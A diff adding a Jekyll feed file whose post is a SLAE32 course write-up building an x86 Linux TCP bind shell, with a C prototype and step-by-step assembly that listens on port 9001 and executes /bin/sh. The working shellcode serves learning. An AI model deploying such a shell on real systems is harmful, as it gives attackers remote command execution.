@@ -1,0 +1,1126 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-01-07T21:39:26+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Crawl3r</title><subtitle>Skidding around the internet</subtitle><author><name>Crawl3r</name></author><entry><title type="html">SLAE32 - 1. TCP Bind Shell</title><link href="http://localhost:4000/2020-01-07/slae32_tcp_bind_shell" rel="alternate" type="text/html" title="SLAE32 - 1. TCP Bind Shell" /><published>2020-01-07T00:00:00+00:00</published><updated>2020-01-07T00:00:00+00:00</updated><id>http://localhost:4000/2020-01-07/slae32_tcp_bind_shell</id><content type="html" xml:base="http://localhost:4000/2020-01-07/slae32_tcp_bind_shell">&lt;h2 id=&quot;introduction&quot;&gt;Introduction:&lt;/h2&gt;
+&lt;p&gt;The first SLAE32 exercise that required a write up was the x86 bind shell, written from scratch. As we know, or may not know, a bind shell does what it says in the name. It binds a shell. Unlike a reverse shell, the process sets up a listener on the host and waits for a connection, once accepted it fires off our new process and pipes the connection through allowing commands to be sent from a remote system and return the output.&lt;/p&gt;
+
+&lt;h2 id=&quot;brief-thoughts&quot;&gt;Brief thoughts:&lt;/h2&gt;
+&lt;p&gt;The actual implementation of the TCP bind shell was relatively straight forward. Using a C based prototype I was able to make a list of required system calls and utilise the Linux man pages to confirm the arguments and how they would need to appear and be set up within the asm file. An important thing to remember is null bytes are bad. We don’t want these to exist in our final project so simple tricks were used to get around these (i.e xor’ing registers with themselves to zero them). These will be highlighted when, and where, they are used.&lt;/p&gt;
+
+&lt;p&gt;## Initial planning:
+To begin with, I needed to know how a TCP bind shell would be implemented in C. As I had just been looking through h0mbre_’s github write ups, I remembered they included a simple one so I used this as my base reference.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;strings.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+
+int main(void) {
+    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    struct sockaddr_in server_addr;
+    server_addr.sin_family = AF_INET;           
+    server_addr.sin_addr.s_addr = INADDR_ANY;  
+    server_addr.sin_port = htons(9001);        
+
+    bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr));
+
+    listen(listen_sock, 0);
+
+    int conn_sock = accept(listen_sock, NULL, NULL);
+
+    dup2(conn_sock, 0);
+    dup2(conn_sock, 1);
+    dup2(conn_sock, 2);
+
+    execve(&quot;/bin/sh&quot;, NULL, NULL);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once I had this, I was easily able to highlight the required system calls and start to gather the information I need to rebuild this is assembly. Utilising the Linux man pages and the Linux headers I crafted the following table which includes the syscall name, the C declaration (including parameters, types and return values) as well as the syscall number. This information may seem a little overkill right now, but it will become obvious when implementing the calls themselves later on in this write up.&lt;/p&gt;
+
+&lt;p&gt;The following table lists the 6 system calls that are required to write our bind shell:&lt;/p&gt;
+
+&lt;table class=&quot;mbtablestyle&quot;&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;System Call&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;C Definition&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Return Value&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Syscall Number&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;socket&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int socket(int domain, int type, int protocol);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;File descriptor for the new socket.&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;359 (0x167)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;bind&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;361 (0x169)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;listen&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int listen(int sockfd, int backlog);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;363 (0x16b)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;accept&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;File descriptor for the new socket.&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;364 (0x16c)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;dup2&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int dup2(int oldfd, int newfd);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;63 (0x3f)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;execve&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;int execve(const char *pathname, char *const argv[], char *const envp[]);&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;n/a&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;11 (0xb)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;In order to create the above table, I used the following command with each syscall to obtain the C definition and return values from the linux manual pages:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;man 2 &amp;lt;function_name&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;As well as this, I used the following command to obtain the syscall value used within assembly to call the correct function:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep &amp;lt;function_name&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Crafting our shell (first draft):
+First things first, we want to create the skeleton of our script (first_bind_shell.asm):&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global   _start
+section .text
+
+_start:
+        ; zero out the common registers that we are likely to use
+        xor eax, eax
+        xor ebx, ebx
+        xor ecx, ecx
+        xor edx, edx
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With close reference to the C script included above, we can begin crafting our system calls in their required order. Ensuring the registers are set up correctly relative to the required parameters.&lt;/p&gt;
+
+&lt;p&gt;The first syscall required is the socket() call. This will create our TCP socket and return a value that we must keep track of, the file descriptor.  As this is our first syscall, I will break down the function and the registers required in order to successfully call it. The function description is int socket(int domain, int type, int protocol); and as we can see, the function is used in the following manner in C int listen_sock = socket(AF_INET, SOCK_STREAM, 0);&lt;/p&gt;
+
+&lt;p&gt;From this we can identify the required steps in assembly from a pseudo code perspective:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Set the EAX register to hold the value of the syscall&lt;/li&gt;
+  &lt;li&gt;Set the EBX register to hold the value of our first parameter (AF_INET)&lt;/li&gt;
+  &lt;li&gt;Set the ECX register to hold the value of our second parameter (SOCK_STREAM)&lt;/li&gt;
+  &lt;li&gt;Set the EDX register to hold the value of our third parameter (0)&lt;/li&gt;
+  &lt;li&gt;Perform the syscall&lt;/li&gt;
+  &lt;li&gt;Store the return value held in the EAX register after the syscall&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Each one of these steps seems pretty simple to implement in assembly using ‘mov’ to place the correct values in the registers and ‘int 0x80’ to execute the syscall. The only information missing are the actual values for AF_INET and SOCK_STREAM, in C these are already defined with their integer values however, here we need the raw integer value.&lt;/p&gt;
+
+&lt;p&gt;The easiest way to get these values would have been to ask my good friend Google. He seems pretty knowledgable but instead I thought I might as well utilise the C types and dump their raw value.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+
+int main(void){
+        printf(&quot;AF_INET: %d\n&quot;, AF_INET);
+        printf(&quot;SOCK_STREAM: %d\n&quot;, SOCK_STREAM);
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Compile and run:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/slae32/misc# gcc test.c 
+root@kali:~/Documents/slae32/misc# ./a.out 
+AF_INET: 2
+SOCK_STREAM: 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we have all the required information, we can set up our target registers correctly and perform our first system call to socket. Looking back at our pseudo code above, we can translate it into the following x86 assembly:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; SOCKET SYSCALL
+; set up the registers
+mov eax, 0x167
+mov ebx, 0x2
+mov ecx, 0x1
+
+int 0x80              ;  execute the syscall
+mov edi, eax          ;  store the return value in edi for future ref
+; above pinched from h0mbre_
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We set EAX to equal 0x167 (359), this is the value used later when the ‘int 0x80’ instruction is hit, which performs the actual syscall to socket. We now want to set up the EBX and ECX registers to hold the parameter values for our call. We set EBX to equal 0x2 (value of AF_INET), and ECX to 0x1 (value of SOCK_STREAM). We can now execute our system call.&lt;/p&gt;
+
+&lt;p&gt;Registers before the call:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  i r
+eax            0x167               0x167
+ecx            0x1                 0x1
+edx            0x0                 0x0
+ebx            0x2                 0x2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Registers after the call:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  i r
+eax            0x3                 0x3
+ecx            0x1                 0x1
+edx            0x0                 0x0
+ebx            0x2                 0x2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we mentioned before. The return value for socket() is stored in the EAX. We can see above that this value is 0x3 (3). This is now our file descriptor and should be used throughout the program within some of the other system calls:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;bind()&lt;/li&gt;
+  &lt;li&gt;listen()&lt;/li&gt;
+  &lt;li&gt;accept()&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can safely keep track of this value by storing it in a register we are unlikely going to use, preventing the value from being corrupted and overwritten. This is done by the final instruction ‘mov edi, eax’.&lt;/p&gt;
+
+&lt;p&gt;Whilst writing this, I was following the execution in gdb - confirming the registers were working the way I wanted them too and the correct call was being made. Once confirmed, it was time to move on to the next syscall - bind().&lt;/p&gt;
+
+&lt;p&gt;Compared to the socket() system call, the bind() call requires quite a few more instructions to function correctly, including setting up the registers and pushing data onto the stack in the correct order, allowing to gain an address to use as a parameter. Looking at the C implementation of bind(), we can see 2 main sections of code include the creation of the ‘server_addr struct’ and the call to bind() itself.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in server_addr;
+server_addr.sin_family = AF_INET;           
+server_addr.sin_addr.s_addr = INADDR_ANY;  
+server_addr.sin_port = htons(9001);        
+
+bind(listen_sock, (struct sockaddr *)&amp;amp;server_addr, sizeof(server_addr));
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first thing we want to do is make sure the EAX register holds the syscall number (361) ready for the execution, we can do this by placing 0x169 into the register. We then want to set our 1st parameter (EBX) to equal the file descriptor returned by the socket() function. Remember, this was stored in EDI.&lt;/p&gt;
+
+&lt;p&gt;We now need our 2nd parameter (ECX) to point to a collection of data in memory that includes the AF_INET, INADDR_ANY and the target port number. To break this down further, we need to obtain our raw values for the following:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;AF_INET&lt;/li&gt;
+  &lt;li&gt;INADDR_ANY&lt;/li&gt;
+  &lt;li&gt;Port value (string) in hex&lt;/li&gt;
+  &lt;li&gt;The size of the structure itself&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Similar to before, I created a small C program to print these values to the screen:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;netinet/in.h&amp;gt;
+
+int main(void){
+        struct sockaddr_in server_addr;
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_addr.s_addr = INADDR_ANY;
+        server_addr.sin_port = htons(9001);
+
+        printf(&quot;AF_INET: %d\n&quot;, server_addr.sin_family);
+        printf(&quot;INADDR_ANY: %d\n&quot;, server_addr.sin_addr.s_addr);
+        printf(&quot;SIZE OF: %d\n&quot;, sizeof(server_addr));
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Compiling and executing the script gave me the following information:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/slae32/misc# ./b.out 
+AF_INET: 2
+INADDR_ANY: 0
+SIZE OF: 16
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we know the AF_INET value, the INADDR_ANY value and the size of the completed struct - we can implement our own struct, push the data onto the stack correctly and obtain the address of this collection of data. The struct itself actually contains 4 different values, which can be seen in the below definition taken from https://www.cs.cmu.edu/~srini/15-441/S10/lectures/r01-sockets.pdf:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;struct sockaddr_in {
+    short sin_family;              // e.g. AF_INET
+    ‏)3490(unsigned short sin_port; // e.g. htons
+    struct in_addr sin_addr;       // see struct in_addr, below 
+    char sin_zero[8];              // zero this if you want to
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So now we know that the data we need to structure within our assembly is the following:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;AF_INET (2)&lt;/li&gt;
+  &lt;li&gt;The port number (I used 9001 - 0x2329)&lt;/li&gt;
+  &lt;li&gt;The address (0.0.0.0 as we are locally binding)&lt;/li&gt;
+  &lt;li&gt;0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The address of this data structure needs to be placed in the 2nd parameter (ECX), luckily the ESP currently points to this data. We need to remember that the port number is of type string, and therefore should be pushed onto the stack as a “word”. With the final addition of the size being placed into the 3rd parameter (EDX), the bind system call is ready to be executed.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; BIND syscall
+xor eax, eax          ; zero out eax
+mov eax, 0x169        ; move 361 into syscall register
+mov ebx, edi          ; move fd (edi val) into ebx - param 1
+
+; create our sockaddr struct in memory, used with bind() call, 2nd param
+xor ecx, ecx
+push ecx              ; 0
+push ecx              ; Address (0.0.0.0)
+push word 0x2923      ;  port number (9001)
+push word 0x2         ;  AF_INET
+
+mov ecx, esp          ; pointer to struct
+mov edx, 16           ; size of struct
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we are ready to implement our call to listen(). Looking at the C implementation above, listen(listen_sock, 0); we can see that we require our EBX register (1st parameter) to equal the value of our file descriptor returned from socket() and our ECX register (2nd parameter) should be equal to 0 before making our call to listen(). In addition to the parameter values, we want to make sure EAX holds the value to the correct system call (363) before calling ‘int 0x80’. This should all look like the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; LISTEN SYSCALL
+xor eax, eax
+mov eax, 0x16b
+mov ebx, edi
+xor ecx, ecx
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next we want to implement our call to accept() which will appear very similar to the listen() call above. Looking at the C implementation, we see it’s usage as int conn_sock = accept(listen_sock, NULL, NULL);. Once again, we require EAX to equal our syscall value (364), we need our first parameter (EBX) to equal our file descriptor from our socket() call, we then need our 2nd (ECX) and 3rd (EDX) parameters to both equal 0. Finally, we execute our system call with ‘int 0x80’.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; ACCEPT SYSCALL
+xor eax, eax
+mov eax, 0x16c
+mov ebx, edi
+xor ecx, ecx
+xor edx, edx
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Similar to socket(), the accept() call returns a file descriptor value to use within our final syscall, dup2(). We want to make sure we keep track of this value so we overwrite our previous file descriptor value stored in the EDI register.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xor edi, edi
+mov edi, eax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The next system call we need is dup2(). The following implementation was written to replicate the C code above, so there are 3 chunks of assembly that are pretty much the same except for one value. This could be cleaned up using a loop, but at this time, I just wanted the code to work. Looking at the C implementation, we see the following:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dup2(conn_sock, 0);
+dup2(conn_sock, 1);
+dup2(conn_sock, 2);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looking at this, we need 3 separate calls to dup2() with 3 different values in the 2nd parameter (0, 1 and 2). For each call, we want to make sure our EAX value holds the value of our syscall (63), the 1st parameter requires the value of our file descriptor received from the accept() call above. The 2nd parameter is the value that needs to be set to 0, 1 and 2 across the 3 seperate calls. Finally, the ‘int 0x80’ is called to execute each system call. My approach at performing these three calls can be seen below:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;; DUP2 SYSCALL
+xor eax, eax
+mov eax, 0x3f
+mov ebx, edi
+xor ecx, ecx
+int 0x80
+
+xor eax, eax
+mov eax, 0x3f
+mov ebx, edi
+xor ecx, ecx
+mov ecx, 0x1
+int 0x80
+
+xor eax, eax
+mov eax, 0x3f
+mov ebx, edi
+xor ecx, ecx
+mov ecx, 0x2
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;By now, our process should have opened a socket, listened for a connection, accepted the incoming connection and set up our pipes into our process. We now want to implement our final system call, which actually gives this entire program any sense of purpose and use, the execve() call. This function allows us to execute our actual shell “/bin/sh”, giving us control over the target. Within the C implementation, the execve call is used like execve(“/bin/sh”, NULL, NULL);.&lt;/p&gt;
+
+&lt;p&gt;Before implementing this in assembly, there is something we need to remember from the manual page and our table above. The manual shows the implementation and it’s parameters as:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int execve(const char *pathname, char *const argv[], char *const envp[]);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the 3 parameters all point to strings (pointers to chars/char arrays). Previously, we could simply set the value of the register to 0, however after attempting to do this for this system call I received errors during execution. After debugging the process for a little while, I tested pointing to nothing on the stack instead of simply setting the register to zero. That way, the register would be a pointer to a memory location, which held nothing. Sounds like a pointer to NULL to me!&lt;/p&gt;
+
+&lt;p&gt;The final thing we need to have is the 1st parameter, which is actually the path to the file we would like to the execute. In this case, I used “/bin/sh”. This was achieved by getting the hex equivalent of this string, flipping it (Little Endian) and pushing it on the stack in 2 chunks. In step by steps, this what it looks like:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;“/bin/sh” in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68&lt;/li&gt;
+  &lt;li&gt;we flip these because it’s little endian&lt;/li&gt;
+  &lt;li&gt;we push the two chunks on separately 0x68732f6e, 0x69622f&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We then need the address of the string to be placed into the first parameter (EBX). Luckily, the string is at the top of the stack and there is a register that holds this address ready for use, ESP. We can set the value of EBX to the value of ESP and achieve this. This can be completed in x86 using the following instructions:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push 0x68732f6e         ; hs/n
+push 0x69622f2f         ; ib//
+mov ebx, esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we need our 2nd (ECX) and 3rd (EDX) parameters to point to NULL values. As I stated above, I initially attempted to just 0 out the registers - however this did not work. So I ended up pushing a zero on to the stack and using the address held in ESP again to reference the top of the stack, which pointed at our zero value after the push. This was completed twice to satisfy both NULL parameters.&lt;/p&gt;
+
+&lt;p&gt;Finally, I set the EAX register to the value 0xb (11), which is the value of the execve system call, and executed it with the ‘int 0x80’ instruction.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xor eax, eax
+push eax
+
+push 0x68732f6e
+push 0x69622f2f
+mov ebx, esp
+
+push eax
+mov ecx, esp
+
+push eax
+mov edx, esp
+
+xor eax, eax
+mov eax, 0xb
+int 0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We should now have a fully functioning TCP bind shell, ready for assembling, linking and executing. When connecting to the bind shell, remember the port number specified in the structure created and used within the bind() system call.&lt;/p&gt;
+
+&lt;p&gt;I created a quick little script to help with assembling and linking my scripts, rather than having to issue 2 separate commands each time:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/slae32/misc# cat build.sh 
+echo &quot;Assembling $1.asm&quot;
+nasm -f elf32 &quot;$1&quot;.asm 
+
+echo &quot;Linking $1.o&quot;
+ld -s -o &quot;$1&quot; &quot;$1&quot;.o
+
+echo &quot;Done&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Usage:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./build.sh tcp_bind_shell&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon assembling and linking the asm file, you should have a functional TCP bind shell.&lt;/p&gt;
+
+&lt;p&gt;The entire first draft script can be seen here:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global  _start
+section .text
+
+_start:
+    ; clear out the registers by xor-ing them with themselves. 0 without null bytes
+    xor eax, eax
+    xor ebx, ebx
+    xor ecx, ecx
+    xor edx, edx
+
+    ; SOCKET SYSCALL
+    ; int socket(int domain, int type, int protocol);
+    ; socket is the first syscall we want with syscall number is 359 (0x167)
+    ; EAX = syscall number, ebx = param 1 (2), ecx = param 2 (1), edx = param 3 (0)
+    ; return's our fd value to EAX, we want to keep this
+    mov eax, 0x167
+    mov ebx, 0x2
+    mov ecx, 0x1
+    ; we don't do anything with edx as 0 already exists from the xor above
+
+    int 0x80 ; this interrupt signal handles the syscall
+    mov edi, eax ; store the return value in edi for future ref
+
+
+    ; BIND syscall
+    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+    xor eax, eax      ; zero out eax
+    mov eax, 0x169    ; move 361 into syscall register
+    mov ebx, edi      ; move fd (edi val) into ebx - param 1
+
+    ; create our sockaddr struct in memory, used with bind() call, 2nd param
+    xor ecx, ecx      ; zero out ecx
+    push ecx          ; push the 0 onto the stack (4th struct value)
+    push ecx          ; push the 0 onto the stack (Address)
+    push word 0x2923  ; push the port onto stack  (0x2329) (PORT NUM = 9001) 
+    push word 0x2     ; push 2 onto the stack     (AF_INET)
+
+    mov ecx, esp      ; store the current stack pointer into ecx, points at struct
+    mov edx, 16       ; this parameter takes the length of the addr (param 3)
+    int 0x80          ; syscall 
+
+    ; LISTEN syscall 363
+    ; int listen(int sockfd, int backlog);
+    xor eax, eax      ; zero out eax
+    mov eax, 0x16b    ; move 363 into register (syscall number)
+    mov ebx, edi      ; this should still be return val from socket() -&amp;gt; fd
+    xor ecx, ecx      ; clean out ecx as the 2nd param value should be 0
+    int 0x80          ; syscall
+
+    ; ACCEPT syscall 364
+    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+    ; we want the return value from EAX (fd update)
+    xor eax, eax      ; zero out eax
+    mov eax, 0x16c    ; move 364 into register (syscall number)
+    mov ebx, edi      ; this should still be return val from socket() -&amp;gt; fd
+    xor ecx, ecx      ; zero out 2nd param (NULL)
+    xor edx, edx      ; zero out 3rd param (NULL)
+    int 0x80          ; syscall
+
+    ; accept() returns a new fd value, so let's store this one off too
+    xor edi, edi      ; 0 out edi before backing up fd
+    mov edi, eax      ; back up the fd value in edi again
+
+    ; DUP2 syscall (3 times)
+    ; int dup2(int oldfd, int newfd);
+    xor eax, eax      ; zero out eax
+    mov eax, 0x3f     ; move 63 into register (syscall number)
+    mov ebx, edi      ; move fd into 1st param (from accept)
+    xor ecx, ecx      ; zero out 2nd param (0)
+    int 0x80          ; syscall (1st)
+
+    xor eax, eax      ; zero out eax
+    mov eax, 0x3f     ; move 63 into register (syscall number)
+    mov ebx, edi      ; move fd into 1st param (from accept)
+    xor ecx, ecx      ; zero out 2nd param (0)
+    mov ecx, 0x1      ; move 1 into 2nd param
+    int 0x80          ; syscall (2nd)
+
+    xor eax, eax      ; zero out eax
+    mov eax, 0x3f     ; move 63 into register (syscall number)
+    mov ebx, edi      ; move fd into 1st param (from accept)
+    xor ecx, ecx      ; zero out 2nd param (0)
+    mov ecx, 0x2      ; move 2 into 2nd param
+    int 0x80          ; syscall (3rd)
+
+    ; EXECVE() syscall
+    ; int execve(const char *pathname, char *const argv[], char *const envp[]);
+    ; NOTE, param 2 and 3 are pointers to strings. XOR, PUSH then point to STACK in register
+    xor eax, eax      ; zero out eax ready for pushing 0s on to the stack
+    push eax          ; push first zero on, align the stack?
+
+    ; &quot;/bin/sh&quot; in hex is 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68
+    ; we flip these because it's little endian
+    ; 0x68732f6e, 0x69622f
+
+    push 0x68732f6e
+    push 0x69622f2f   ; note the // at the end, sigsevs without - junk corrupting it?
+    mov ebx, esp      ; push the addr of our above string (esp) into 1st param
+
+    push eax          ; push 0 onto the stack (2nd param == NULL)
+    mov ecx, esp      ; requires a pointer - man page has them for usage
+
+    push eax          ; push 0 onto the stack (3rd param == NULL)
+    mov edx, esp      ; requires a pointer - man page has them for usage
+
+    xor eax, eax      ; zero out eax
+    mov eax, 0xb      ; move 11 into EAX register (syscall number)
